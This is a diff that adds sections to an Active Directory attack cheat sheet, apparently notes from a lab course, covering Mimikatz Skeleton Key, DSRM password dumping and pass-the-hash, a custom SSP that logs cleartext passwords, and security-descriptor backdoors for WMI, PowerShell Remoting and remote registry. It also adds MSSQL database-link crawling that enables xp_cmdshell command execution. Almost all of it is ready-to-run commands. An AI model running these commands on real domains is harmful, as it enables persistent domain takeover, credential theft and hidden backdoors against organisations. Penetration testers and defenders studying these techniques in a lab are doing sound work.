@@ -518,6 +518,141 @@ schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Autho
 schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "DBCheck"
 ```
 
+## Skeleton Key
+
+With DA privileges, it is possible to patch a Domain Controller (LSASS process) so that it allows access as any user with a single password.
+
+```powershell
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+```
+
+The enables access any machine with a valid username using a password of `mimikatz`:
+```powershell
+# Default password is mimikatz
+Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
+```
+
+In case LSASS is running as a protected process, we can still use Skeleton Key but it needs the Mimikatz driver (`mimidriv.sys`) on disk of the target DC:
+```bash
+mimikatz # privilege::debug
+mimikatz # !+
+mimikatz # !processprotect /process:lsass.exe /remove
+mimikatz # misc::skeleton
+mimikatz # !-
+```
+
+## Directory Services Restore Mode
+
+The DSRM password (`SafeModePassword`) is required when a server is promoted to Domain Controller and it is rarely changed. 
+
+Dump DSRM password (needs DA privileges):
+```powershell
+Invoke-Mimikatz-Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc
+```
+
+After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.
+```powershell
+# Change DSRM account logon behaviour
+Enter-PSSession -Computername dcorp-dc
+New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+
+# Pass the hash
+Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
+```
+
+## Custom SSP
+A Security Support Provider (SSP) is a DLL which provides methods for an application to obtain an authenticated connection. Some SSP Packages by Microsoft are 
+- NTLM
+- Kerberos
+- Wdigest
+- CredSSP
+Mimikatz provides a custom SSP - `mimilib.dll`. This SSP logs local logons, service account and machine account passwords in clear text on the target server.
+
+To achieve this we can use two techniques:
+
+1. Drop mimilib.dll to System32 and add it to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`:
+
+```powershell
+$packages=Get-ItemProperty
+HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages' 
+$packages+="mimilib"
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
+```
+
+2. Using mimikatz, inject into LSASS (Not stable with Server 2016)
+```powershell
+Invoke-Mimikatz -Command '"misc::memssp"'
+```
+
+From then on all local logons on the DC are logged to `C:\Windows\system32\kiwissp.log`.
+
+## Security Descriptors 
+
+It is possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (securable objects) to allow access to non-admin users. 
+
+Administrative privileges are required for modifications such as these.
+
+### WMI
+
+On local machine for student1:
+```powershell
+Set-RemoteWMI -UserName student1 -Verbose
+```
+
+On remote machine for student1 without explicit credentials:
+```powershell
+Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
+```
+
+On remote machine with explicit credentials. Only `root\cimv2` and nested namespaces:
+```powershell
+Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose
+```
+
+On remote machine remove permissions:
+```powershell
+Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -namespace 'root\cimv2'-Remove -Verbose
+```
+
+### PowerShell Remoting
+
+On local machine for student1:
+```powershell
+Set-RemotePSRemoting -UserName student1-Verbose
+```
+
+On remote machine for student1 without credentials:
+```powershell
+Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc -Verbose
+```
+
+On remote machine, remove the permissions:
+```powershell
+Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc -Remove
+```
+
+### Remote Registry
+
+Using DAMP, with admin privs on remote machine:
+```powershell
+Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
+```
+
+As `student1`, retrieve machine account hash:
+```powershell
+Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
+```
+
+Retrieve local account hash:
+```powershell
+Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
+```
+
+Retrieve domain cached credentials:
+```powershell
+Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
+```
 
 # Cross-Trust Privilege Escalation
 
@@ -553,6 +688,73 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarco
 ```
 
 The rest of the attack is as follows above.
+
+## Trust Abuse - MSSQL Servers
+SQL Servers provide very good options for lateral movement as domain users can be mapped to database roles.
+
+[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
+```powershell
+# Discovery (SPN Scanning)
+Get-SQLInstanceDomain
+
+# Check accessibility
+Get-SQLConnectionTestThreaded
+
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
+
+# Gather information
+Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
+```
+
+### Database Links
+A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources.
+
+In case of database links between SQL servers, it is possible to execute stored procedures.
+
+Database links work even across forest trusts.
+
+#### Searching Database Links
+Look for links to remote servers
+```powershell
+Get-SQLServerLink -Instance dcorp-mssql -Verbose
+# or
+select * from master..sysservers
+```
+
+#### Enumerating Database Links
+**Manually**
+`openquery()` function can be used to run queries on a linked database
+```sql
+select * from openquery("dcorp-sql1",'select * from master..sysservers')
+```
+
+**PowerUpSQL**
+```powershell
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
+```
+
+Or Openquery queries can be chained to access nested links.
+```sql
+select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from master..sysservers'')')
+```
+
+#### Executing Commands
+- On the target server, either `xp_cmdshell` should be already enabled; or
+- If `rpcout` is enabled (disabled by default), `xp_cmdshell` can be enabled using:
+```sql
+EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
+```
+
+```powershell
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'"
+```
+
+From the initial SQL server, OS commands can be executed using nested
+link queries:
+
+```sql
+select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')
+```
 
 # Mimikatz reference
 
